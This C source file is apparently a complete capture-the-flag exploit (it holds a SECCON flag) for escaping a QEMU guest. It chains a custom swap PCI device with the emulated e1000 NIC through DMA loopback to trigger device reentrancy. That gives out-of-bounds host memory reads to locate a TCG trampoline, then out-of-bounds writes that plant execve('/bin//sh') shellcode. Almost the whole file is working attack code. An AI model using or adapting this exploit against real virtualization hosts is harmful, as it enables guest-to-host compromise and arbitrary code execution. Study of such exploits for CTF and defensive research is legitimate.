#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/pci_regs.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "e1000_regs.h"
#include "mii.h"

// ============== Utility Functions ==============

#define PAGE_SIZE 0x1000

void die(const char *msg) {
  perror(msg);
  exit(1);
}

void hexdump(const void *data, size_t len) {
  const uint8_t *p = data;
  for (size_t i = 0; i < len; i++) {
    printf("%02x ", p[i]);
  }
  printf("\n");
}

void pci_enable_master(const char *dev) {
  char path[64];
  snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/config", dev);
  int fd = open(path, O_RDWR | O_SYNC);
  if (fd < 0)
    die("open pci config");
  uint16_t cmd;
  if (pread(fd, &cmd, sizeof(cmd), PCI_COMMAND) != sizeof(cmd))
    die("pread pci config");
  cmd |= PCI_COMMAND_MASTER;
  if (pwrite(fd, &cmd, sizeof(cmd), PCI_COMMAND) != sizeof(cmd))
    die("pwrite pci config");
  close(fd);
}

void *pci_map_resource0(const char *dev, size_t size) {
  char path[64];
  snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/resource0", dev);
  int fd = open(path, O_RDWR | O_SYNC);
  if (fd < 0)
    die("open pci resource0");
  void *mmio = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  close(fd);
  if (mmio == MAP_FAILED)
    die("mmap pci resource0");
  return mmio;
}

uint64_t pci_resource_phys(const char *dev) {
  char path[64];
  snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/resource", dev);
  FILE *f = fopen(path, "r");
  if (!f)
    die("open pci resource");
  uint64_t phys;
  fscanf(f, "%lx", &phys);
  fclose(f);
  return phys;
}

uint64_t virt_to_phys(void *virt) {
  int fd = open("/proc/self/pagemap", O_RDONLY);
  if (fd < 0)
    die("open pagemap");

  uint64_t virt_pfn = (uint64_t)virt / PAGE_SIZE;
  uint64_t offset = virt_pfn * 8;

  uint64_t entry;
  if (pread(fd, &entry, 8, offset) != 8)
    die("pread pagemap");
  close(fd);

  if (!(entry & (1ULL << 63)))
    die("page not present");

  uint64_t phys_pfn = entry & ((1ULL << 55) - 1);
  return (phys_pfn * PAGE_SIZE) | ((uint64_t)virt & (PAGE_SIZE - 1));
}

// Ugly but effective contiguous page allocator
#define MAX_PAGES 65536

struct page_info {
  void *virt;
  uint64_t phys;
};

static int compare_phys(const void *a, const void *b) {
  const struct page_info *pa = a, *pb = b;
  if (pa->phys < pb->phys)
    return -1;
  if (pa->phys > pb->phys)
    return 1;
  return 0;
}

void *alloc_dma_pages(size_t n_pages, uint64_t *phys_out) {
  // Allocate 16MB pool upfront
  size_t pool_pages = 16 * 1024 * 1024 / PAGE_SIZE;
  size_t pool_size = pool_pages * PAGE_SIZE;

  void *pool = mmap(NULL, pool_size, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (pool == MAP_FAILED)
    die("mmap pool");
  memset(pool, 0, pool_size);

  struct page_info *pages = malloc(pool_pages * sizeof(struct page_info));
  if (!pages)
    die("malloc page_info");

  // Get physical addresses for all pages
  for (size_t i = 0; i < pool_pages; i++) {
    pages[i].virt = (uint8_t *)pool + i * PAGE_SIZE;
    pages[i].phys = virt_to_phys(pages[i].virt);
  }

  // Sort by physical address
  qsort(pages, pool_pages, sizeof(struct page_info), compare_phys);

  // Find n_pages contiguous physical pages
  size_t start_idx = 0;
  int found = 0;
  for (size_t i = 0; i <= pool_pages - n_pages; i++) {
    int contig = 1;
    for (size_t j = 1; j < n_pages && contig; j++) {
      if (pages[i + j].phys != pages[i].phys + j * PAGE_SIZE)
        contig = 0;
    }
    if (contig) {
      start_idx = i;
      found = 1;
      break;
    }
  }

  if (!found)
    die("failed to find contiguous pages");

  // Step 2: Unmap pages outside the interesting range
  for (size_t i = 0; i < pool_pages; i++) {
    if (i < start_idx || i >= start_idx + n_pages) {
      munmap(pages[i].virt, PAGE_SIZE);
    }
  }

  // Step 3: Create contiguous virtual mapping
  void *dest = mmap(NULL, n_pages * PAGE_SIZE, PROT_NONE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dest == MAP_FAILED)
    die("mmap placeholder");

  // Remap each page into the contiguous region
  for (size_t i = 0; i < n_pages; i++) {
    void *target = (uint8_t *)dest + i * PAGE_SIZE;
    void *result = mremap(pages[start_idx + i].virt, PAGE_SIZE, PAGE_SIZE,
                          MREMAP_MAYMOVE | MREMAP_FIXED, target);
    if (result != target)
      die("mremap");
  }

  *phys_out = pages[start_idx].phys;
  free(pages);

  // Verify physical addresses are contiguous starting from *phys_out
  for (size_t i = 0; i < n_pages; i++) {
    uint64_t expected_phys = *phys_out + i * PAGE_SIZE;
    uint64_t actual_phys = virt_to_phys((uint8_t *)dest + i * PAGE_SIZE);
    if (actual_phys != expected_phys) {
      printf("[alloc] page %zu: expected phys 0x%lx, got 0x%lx\n", i,
             expected_phys, actual_phys);
      die("phys addr not preserved after mremap");
    }
  }

  return dest;
}

void *alloc_dma_page(uint64_t *phys_out) {
  return alloc_dma_pages(1, phys_out);
}

// Forward declaration
void e1000_xfer(uint64_t src_phys, uint64_t dst_phys, size_t len);

// ============== SWP Device ==============
#define REG_ADDRESS 0x00
#define REG_SIZE 0x08
#define REG_MODE 0x0c
#define REG_TRIGGER 0x10

#define MODE_SWAPOUT 0 // Read from guest to storage
#define MODE_SWAPIN 1  // Write from storage to guest
#define SWP_TRIGGER 0x005ECC02

volatile uint8_t *swp_mmio;
uint64_t swp_mmio_phys;

void swp_write64(uint64_t offset, uint64_t val) {
  *(volatile uint64_t *)(swp_mmio + offset) = val;
}

void swp_write32(uint64_t offset, uint32_t val) {
  *(volatile uint32_t *)(swp_mmio + offset) = val;
}

uint64_t swp_read64(uint64_t offset) {
  return *(volatile uint64_t *)(swp_mmio + offset);
}

uint32_t swp_read32(uint64_t offset) {
  return *(volatile uint32_t *)(swp_mmio + offset);
}

void swp_init(void) {
  pci_enable_master("0000:00:04.0");
  swp_mmio = pci_map_resource0("0000:00:04.0", PAGE_SIZE);
  swp_mmio_phys = pci_resource_phys("0000:00:04.0");
  printf("[swp] Mapped MMIO at %p, phys=0x%lx\n", swp_mmio, swp_mmio_phys);
}

// Transfer data from src_phys to dst_phys using SWP device
void swp_xfer(uint64_t src_phys, uint64_t dst_phys, size_t len) {
  printf("[swp_xfer] Allocating storage...\n");
  swp_write32(REG_SIZE, len);

  printf("[swp_xfer] Writing SWAPOUT command...\n");
  swp_write64(REG_ADDRESS, src_phys);
  swp_write32(REG_MODE, MODE_SWAPOUT);
  swp_write32(REG_TRIGGER, SWP_TRIGGER);

  printf("[swp_xfer] Writing SWAPIN command...\n");
  swp_write64(REG_ADDRESS, dst_phys);
  swp_write32(REG_MODE, MODE_SWAPIN);
  swp_write32(REG_TRIGGER, SWP_TRIGGER);
}

// Transfer data from src_phys to dst_phys using SWP + e1000
// 1. Load src into SWP storage
// 2. Send payload via e1000 to SWP MMIO to trigger SWAPIN to dst
void swp_xfer_via_e1000(uint64_t src_phys, uint64_t dst_phys, size_t len) {
  // Step 1: Allocate SWP storage and load source data
  swp_write32(REG_SIZE, len);
  swp_write64(REG_ADDRESS, src_phys);
  swp_write32(REG_MODE, MODE_SWAPOUT);
  swp_write32(REG_TRIGGER, SWP_TRIGGER);

  // Step 2: Create payload that will write to SWP MMIO registers
  // When e1000 DMAs this to swp_mmio_phys, it triggers SWAPIN
  uint64_t payload_phys;
  uint8_t *payload = alloc_dma_page(&payload_phys);

  // Build SWP command payload:
  // REG_ADDRESS (0x00): dst_phys
  // REG_SIZE (0x08): len (won't change, same as before)
  // REG_MODE (0x0c): MODE_SWAPIN
  // REG_TRIGGER (0x10): SWP_TRIGGER
  *(uint64_t *)(payload + REG_ADDRESS) = dst_phys;
  *(uint32_t *)(payload + REG_SIZE) = len;
  *(uint32_t *)(payload + REG_MODE) = MODE_SWAPIN;
  *(uint32_t *)(payload + REG_TRIGGER) = SWP_TRIGGER;

  // Step 3: Send payload to SWP MMIO via e1000 loopback
  e1000_xfer(payload_phys, swp_mmio_phys, REG_TRIGGER + 4);
}

// ============== e1000 Device ==============
#define E1000_MMIO_SIZE 0x20000

volatile uint8_t *e1000_mmio;
uint64_t e1000_mmio_phys;

// Descriptor rings (must be 16-byte aligned)
struct e1000_tx_desc *tx_ring;
struct e1000_rx_desc *rx_ring;
uint64_t tx_ring_phys;
uint64_t rx_ring_phys;

static inline void e1000_write(uint32_t reg, uint32_t val) {
  *(volatile uint32_t *)(e1000_mmio + reg) = val;
}

static inline uint32_t e1000_read(uint32_t reg) {
  return *(volatile uint32_t *)(e1000_mmio + reg);
}

void e1000_phy_write(uint8_t reg, uint16_t val) {
  uint32_t mdic = val | ((uint32_t)reg << E1000_MDIC_REG_SHIFT) |
                  (1 << E1000_MDIC_PHY_SHIFT) | E1000_MDIC_OP_WRITE;

  e1000_write(E1000_MDIC, mdic);

  if (!(e1000_read(E1000_MDIC) & E1000_MDIC_READY))
    die("e1000 PHY write not ready");
}

void e1000_init(void) {
  pci_enable_master("0000:00:03.0");
  e1000_mmio = pci_map_resource0("0000:00:03.0", E1000_MMIO_SIZE);
  e1000_mmio_phys = pci_resource_phys("0000:00:03.0");
  printf("[e1000] Mapped MMIO at %p, phys=0x%lx\n", e1000_mmio,
         e1000_mmio_phys);
  printf("[e1000] STATUS = 0x%08x\n", e1000_read(E1000_STATUS));

  // Reset device
  e1000_write(E1000_CTRL, E1000_CTRL_RST);

  // Enable PHY loopback
  printf("[e1000] Enabling PHY loopback...\n");
  e1000_phy_write(
      MII_BMCR, /* No MII_BMCR_AUTOEN - force link up for e1000x_rx_ready() */
      MII_BMCR_SPEED1000 | MII_BMCR_FD | MII_BMCR_LOOPBACK);

  // Allocate descriptor rings
  tx_ring = alloc_dma_page(&tx_ring_phys);
  rx_ring = alloc_dma_page(&rx_ring_phys);
  printf("[e1000] TX ring phys: 0x%lx\n", tx_ring_phys);
  printf("[e1000] RX ring phys: 0x%lx\n", rx_ring_phys);

  // Set up TX descriptor ring
  e1000_write(E1000_TDBAL, tx_ring_phys & 0xFFFFFFFF);
  e1000_write(E1000_TDBAH, tx_ring_phys >> 32);
  e1000_write(E1000_TDLEN, (PAGE_SIZE / sizeof(struct e1000_tx_desc)) *
                               sizeof(struct e1000_tx_desc));
  e1000_write(E1000_TDH, 0);
  e1000_write(E1000_TDT, 0);
  printf("[e1000] TDBAL=0x%x TDBAH=0x%x\n", e1000_read(E1000_TDBAL),
         e1000_read(E1000_TDBAH));

  // Set up RX descriptor ring
  e1000_write(E1000_RDBAL, rx_ring_phys & 0xFFFFFFFF);
  e1000_write(E1000_RDBAH, rx_ring_phys >> 32);
  e1000_write(E1000_RDLEN, (PAGE_SIZE / sizeof(struct e1000_rx_desc)) *
                               sizeof(struct e1000_rx_desc));
  e1000_write(E1000_RDH, 0);
  e1000_write(E1000_RDT, 0);

  // Enable TX
  e1000_write(E1000_TCTL, E1000_TCTL_EN);

  // Enable RX
  e1000_write(E1000_RCTL, E1000_RCTL_EN /* checked by e1000x_rx_ready() */ |
                              /* Accept broadcast, multicast, and unicast in
                                 e1000x_rx_group_filter() */
                              E1000_RCTL_BAM | E1000_RCTL_MPE | E1000_RCTL_UPE |
                              /* 4KB buffer size */
                              E1000_RCTL_BSEX | E1000_RCTL_SZ_4096);

  // Make flush_queue_timer expire for e1000_can_receive()
  usleep(1100000);

  printf("[e1000] Initialization complete\n");
  printf("[e1000] CTRL = 0x%08x\n", e1000_read(E1000_CTRL));
  printf("[e1000] TCTL = 0x%08x\n", e1000_read(E1000_TCTL));
  printf("[e1000] RCTL = 0x%08x\n", e1000_read(E1000_RCTL));
}

// Prepare e1000 descriptors for transfer
void e1000_xfer_prepare(uint64_t src_phys, uint64_t dst_phys, size_t len) {
  // Set up RX descriptor - e1000 will DMA received data HERE
  rx_ring[0].buffer_addr = dst_phys;
  rx_ring[0].length = 0;
  rx_ring[0].status = 0;

  // Set up TX descriptor - e1000 reads data from HERE
  tx_ring[0].buffer_addr = src_phys;
  tx_ring[0].lower.data =
      len | E1000_TXD_CMD_RS /* request setting E1000_TXD_STAT_DD */ |
      E1000_TXD_CMD_EOP /* trigger xmit_seg() */;
  tx_ring[0].upper.fields.status = 0;

  // Reset descriptor ring pointers
  e1000_write(E1000_TDH, 0);
  e1000_write(E1000_TDT, 0);
  e1000_write(E1000_RDH, 0);
  e1000_write(E1000_RDT, 1); // One RX descriptor available
}

// Start the transfer (synchronous in QEMU)
void e1000_xfer_start(void) { e1000_write(E1000_TDT, 1); }

// Check transfer completion
void e1000_xfer_wait(void) {
  if (!(tx_ring[0].upper.fields.status & E1000_TXD_STAT_DD))
    die("e1000 TX did not complete");
  if (!(rx_ring[0].status & E1000_RXD_STAT_DD))
    die("e1000 RX did not complete");
}

// Full transfer (prepare + start + wait)
void e1000_xfer(uint64_t src_phys, uint64_t dst_phys, size_t len) {
  e1000_xfer_prepare(src_phys, dst_phys, len);
  e1000_xfer_start();
  e1000_xfer_wait();
}

// Transfer using e1000, but trigger via SWP write to e1000 MMIO
void __e1000_xfer_via_swp(uint64_t src_phys, uint64_t dst_phys, size_t len,
                          size_t swp_len) {
  printf("[e1000_xfer_via_swp] Preparing e1000 descriptors...\n");
  e1000_xfer_prepare(src_phys, dst_phys, len);

  printf("[e1000_xfer_via_swp] Allocating page for e1000 MMIO...\n");
  uint64_t page_phys;
  uint8_t *page = alloc_dma_page(&page_phys);

  uint64_t mmio_offset = E1000_TDBAL & ~0xFFFULL;

  printf("[e1000_xfer_via_swp] Filling TX descriptor ring registers...\n");
  *(uint32_t *)(page + (E1000_TDBAL - mmio_offset)) = tx_ring_phys & 0xFFFFFFFF;
  *(uint32_t *)(page + (E1000_TDBAH - mmio_offset)) = tx_ring_phys >> 32;
  *(uint32_t *)(page + (E1000_TDLEN - mmio_offset)) =
      (PAGE_SIZE / sizeof(struct e1000_tx_desc)) * sizeof(struct e1000_tx_desc);
  *(uint32_t *)(page + (E1000_TDH - mmio_offset)) = 0;
  *(uint32_t *)(page + (E1000_TDT - mmio_offset)) = 1;

  printf("[e1000_xfer_via_swp] Writing page to e1000 MMIO...\n");
  swp_xfer(page_phys, e1000_mmio_phys + mmio_offset, swp_len);

  printf("[e1000_xfer_via_swp] Checking completion...\n");
  e1000_xfer_wait();
}

void e1000_xfer_via_swp(uint64_t src_phys, uint64_t dst_phys, size_t len) {
  __e1000_xfer_via_swp(src_phys, dst_phys, len, PAGE_SIZE);
}

// ============== Exploit ==============

// Try to land here:
// 7ac8cbe00000-7ac8cbe01000 ---p 00000000 00:00 0
// [hole: 0x1ff000]
// 7ac8cc000000-7ac90bfff000 rwxp 00000000 00:00 0
// #define SWP_LEN 0x1ff000
#define SWP_LEN 0x100000

void do_leak(void) {
  printf("\n=== Leak Primitive ===\n\n");

  // Allocate leak buffer (must be contiguous)
  uint64_t leak_phys;
  void *leak_buf = alloc_dma_pages(SWP_LEN / PAGE_SIZE, &leak_phys);
  printf("[leak] Allocated leak buffer: virt=%p, phys=0x%lx, size=0x%x\n",
         leak_buf, leak_phys, SWP_LEN);

  // Allocate space for SWP payload
  uint64_t payload_phys;
  uint8_t *payload = alloc_dma_page(&payload_phys);
  printf("[leak] Allocated payload buffer: virt=%p, phys=0x%lx, size=0x%x\n",
         payload, payload_phys, PAGE_SIZE);

  for (;;) {
    // Build SWP payload that will trigger OOB read
    // Account for one page processed by e1000_xfer_via_swp()
    *(uint64_t *)(payload + REG_ADDRESS) = leak_phys - PAGE_SIZE;
    *(uint32_t *)(payload + REG_SIZE) = SWP_LEN + PAGE_SIZE;
    *(uint32_t *)(payload + REG_MODE) = MODE_SWAPIN;

    // Make sure problems with leaking are noticeable
    memset(leak_buf, 0xcc, SWP_LEN);

    // Use e1000_xfer_via_swp to send payload to SWP MMIO
    // This triggers reentrancy: swp_xfer allocates small storage,
    // then e1000 DMAs our payload to SWP MMIO, setting size=SWP_LEN
    // Original swp_xfer continues with old storage_base but new size -> OOB
    // read!
    __e1000_xfer_via_swp(payload_phys, swp_mmio_phys, REG_TRIGGER, SWP_LEN);

    // Look for TCG trampoline
    static const uint8_t needle[] = {0x55, 0x53, 0x41, 0x54, 0x41, 0x55,
                                     0x41, 0x56, 0x41, 0x57, 0x48, 0x8b,
                                     0xef, 0x48, 0x81, 0xc4};
    void *found = memmem(leak_buf, SWP_LEN, needle, sizeof(needle));
    if (found) {
      printf("[leak] Found TCG trampoline at offset 0x%lx\n",
             (uint8_t *)found - (uint8_t *)leak_buf);
      hexdump(found, 64);
      break;
    }
  }
}

// do_leak() shows this one quite often
// #define PWN_OFF 0x1fe000
#define PWN_OFF 0xff000

// 0x74e4e4000000:    push   %rbp
// 0x74e4e4000001:    push   %rbx
// 0x74e4e4000002:    push   %r12
// 0x74e4e4000004:    push   %r13
// 0x74e4e4000006:    push   %r14
// 0x74e4e4000008:    push   %r15
// 0x74e4e400000a:    mov    %rdi,%rbp
// 0x74e4e400000d:    add    $0xfffffffffffffb78,%rsp
// 0x74e4e4000014:    jmp    *%rsi
// 0x74e4e4000016:    xor    %eax,%eax  # put shellcode here
#define TCG_OFF 0x16

/* https://www.exploit-db.com/exploits/47008 */
static const unsigned char shellcode[] = "\x48\x31\xf6\x56\x48\xbf"
                                         "\x2f\x62\x69\x6e\x2f"
                                         "\x2f\x73\x68\x57\x54"
                                         "\x5f\xb0\x3b\x99\x0f\x05";

void do_pwn(void) {
  printf("\n=== PWN ===\n\n");

  // Allocate pwn buffer (must be contiguous)
  uint64_t pwn_phys;
  void *pwn_buf = alloc_dma_pages(SWP_LEN / PAGE_SIZE, &pwn_phys);
  printf("[pwn] Allocated pwn buffer: virt=%p, phys=0x%lx, size=0x%x\n",
         pwn_buf, pwn_phys, SWP_LEN);

  // Allocate space for SWP payload
  uint64_t payload_phys;
  uint8_t *payload = alloc_dma_page(&payload_phys);

  for (;;) {
    // Build SWP payload that will trigger OOB write
    // Account for one page processed by e1000_xfer_via_swp()
    *(uint64_t *)(payload + REG_ADDRESS) = pwn_phys - PAGE_SIZE;
    *(uint32_t *)(payload + REG_SIZE) = SWP_LEN + PAGE_SIZE;
    *(uint32_t *)(payload + REG_MODE) = MODE_SWAPOUT;

    // Write shellcode that will overwrite TCG trampoline
    memcpy(pwn_buf + PWN_OFF + TCG_OFF, shellcode, sizeof(shellcode));

    // Use e1000_xfer_via_swp to send payload to SWP MMIO
    // This triggers reentrancy: swp_xfer allocates small storage,
    // then e1000 DMAs our payload to SWP MMIO, setting size=SWP_LEN
    // Original swp_xfer continues with old storage_base but new size -> OOB
    // write!
    __e1000_xfer_via_swp(payload_phys, swp_mmio_phys, REG_TRIGGER, SWP_LEN);
  }
}

// ============== Test ==============

typedef void (*xfer_fn_t)(uint64_t src_phys, uint64_t dst_phys, size_t len);

void test_xfer(const char *name, xfer_fn_t xfer, size_t len) {
  printf("=== %s Test ===\n\n", name);

  // Allocate two test pages
  uint64_t src_phys, dst_phys;
  void *src_page = alloc_dma_page(&src_phys);
  void *dst_page = alloc_dma_page(&dst_phys);

  printf("[test] Source page: virt=%p, phys=0x%lx\n", src_page, src_phys);
  printf("[test] Dest page:   virt=%p, phys=0x%lx\n", dst_page, dst_phys);

  // Write unique pattern to source page (0-255 repeated)
  for (size_t i = 0; i < len; i++) {
    ((uint8_t *)src_page)[i] = i & 0xff;
  }

  printf("[test] Source page first 32 bytes:\n");
  hexdump(src_page, 32);

  // Transfer
  printf("[test] Performing %s transfer...\n", name);
  xfer(src_phys, dst_phys, len);

  // Check destination
  printf("[test] Dest page first 32 bytes (after):\n");
  hexdump(dst_page, 32);

  // Verify entire transfer
  if (memcmp(src_page, dst_page, len) != 0)
    die("pattern mismatch");
  printf("[test] Pattern verified!\n");

  printf("=== Test Complete ===\n\n");
}

// ============== Main ==============

int main(void) {
  if (mlockall(MCL_CURRENT | MCL_FUTURE) < 0)
    die("mlockall");

  swp_init();
  e1000_init();

  if (getenv("TEST")) {
    test_xfer("SWP", swp_xfer, PAGE_SIZE);
    test_xfer("e1000", e1000_xfer, 256);
    test_xfer("SWP via e1000", swp_xfer_via_e1000, PAGE_SIZE);
    test_xfer("e1000 via SWP", e1000_xfer_via_swp, 256);
    return 0;
  }

  if (getenv("LEAK")) {
    do_leak();
    return 0;
  }

  do_pwn(); // SECCON{r3-en7r4ncy_4t7ack_1s_n0t_on1y_f0r_sm4rt_c0ntrac7s}
  return 0;
}
